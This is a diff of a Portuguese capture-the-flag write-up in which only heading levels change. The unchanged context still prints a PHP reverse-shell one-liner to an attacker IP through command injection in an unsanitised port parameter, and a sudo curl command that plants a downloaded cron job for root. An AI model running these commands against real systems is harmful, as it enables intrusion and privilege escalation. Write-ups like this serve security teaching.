@@ -76,7 +76,7 @@ A porta (`$port`) é concatenada sem sanitização, portanto um atacante pode in
 
 ![Vulnerability analysis](/images/hackingclub-reborn/file-reborn-2025-6.png)
 
-### Reverse Shell
+## Reverse Shell
 
 Aproveitando o input (`$port`) onde não faz o `escapeshellarg`.
 
@@ -86,7 +86,7 @@ php -r '$sock=fsockopen('10.0.73.93',1234);exec('sh <&3 >&3 2>&3');'
 
 ![Reverse shell](/images/hackingclub-reborn/file-reborn-2025-7.png)
 
-### Zabbix
+## Zabbix
 
 Acessando arquivo de configuração do banco de dados Zabbix.
 
@@ -154,7 +154,7 @@ Subindo servidor localmente.
 
 ![Server local](/images/hackingclub-reborn/file-reborn-2025-18.png)
 
-### Obtendo shell de root
+## Obtendo shell de root
 
 ```bash
 sudo /usr/bin/curl -fsSL http://10.0.73.93:8000/cron_pwn -o /etc/cron.d/pwn
@@ -172,7 +172,7 @@ sudo /usr/bin/curl -fsSL http://10.0.73.93:8000/cron_pwn -o /etc/cron.d/pwn
 - `http://10.0.73.93:8080/cron_pwn` → URL onde está o arquivo a ser baixado.  
 - `-o /etc/cron.d/pwn` → Salva o arquivo baixado no diretório `/etc/cron.d/` com o nome `pwn`.
 
-### O que isso faz no sistema
+**O que isso faz ?**
 
 > ❌ Baixa remotamente um arquivo chamado `cron_pwn` e o coloca no diretório `/etc/cron.d/`, que é usado para configurar tarefas agendadas no cron. Todas as tarefas são executadas a cada um minuto. Isso significa que o arquivo baixado provavelmente contém uma tarefa cron que será executada automaticamente com privilégios de root.
 {: .prompt-danger}
